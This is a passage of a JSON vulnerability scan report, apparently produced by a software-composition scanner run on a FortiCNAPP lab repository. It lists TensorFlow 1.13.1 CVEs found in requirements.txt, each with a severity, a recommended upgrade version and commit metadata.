                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29563",
          "ruleIndex": 110,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29563 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29563](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29563)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "911fff7b7a77352fd815b1dacbe7c65064f1366b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29599",
          "ruleIndex": 111,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29599 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29599](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29599)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2ce2fdd9c7ad33018df3a94e6eea8d11fbf48c7e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29516",
          "ruleIndex": 112,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29516 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29516](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29516)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d2c712c72f7aaa1eee1faf1fd189fcdea00722ce"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29609",
          "ruleIndex": 113,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29609 (severity: medium, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29609)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fd1320c9dad3381eeda55ba7c3b8a480d23d614d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29588",
          "ruleIndex": 114,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29588 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29588](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29588)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "463fb423fd7381aaf8b029d6fc5955fc2012e724"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29553",
          "ruleIndex": 115,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29553 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29553](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29553)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f71658b1f3893e2cac4b17b3d566adbf727d66b2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29578",
          "ruleIndex": 116,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29578 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29578](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29578)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f9b2f05e3c41852318a3b95edf960a1661692310"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29524",
          "ruleIndex": 117,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29524 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29524](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29524)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "90f3d971533ee9c91b8fb82441a5b28e8dc53811"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29569",
          "ruleIndex": 118,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29569 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29569](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29569)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "79e18f43417e4204c6bb680c277295f2d490ab04"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29566",
          "ruleIndex": 119,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29566 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29566](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29566)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "99ad688371d206035c291bda97678342a95ba748"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29539",
          "ruleIndex": 120,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29539 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29539](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29539)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "075d83e86ce0ac14cdc07211c04a0a08e11b6df3"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29618",
          "ruleIndex": 121,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29618 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29618](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29618)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3acc3bee6d5e7355b8b4b01895cbee33784ae4e1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29564",
          "ruleIndex": 122,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29564 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29564](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29564)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5038aed3b053231743727e5a468d5bab64ae9586"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29614",
          "ruleIndex": 123,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29614 (severity: medium, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29614](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29614)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "22f7966e5b7e0ba28a192fac431226bfe89c7397"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29551",
          "ruleIndex": 124,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29551 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29551](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29551)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "81c4cea46a73ca33edd8ae322ac402593d6c4a5e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29616",
          "ruleIndex": 125,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29616 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29616](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29616)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7ab584756b343c1f558df338a1cf7e626331f8aa"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29531",
          "ruleIndex": 126,
          "level": "note",
          "message": {
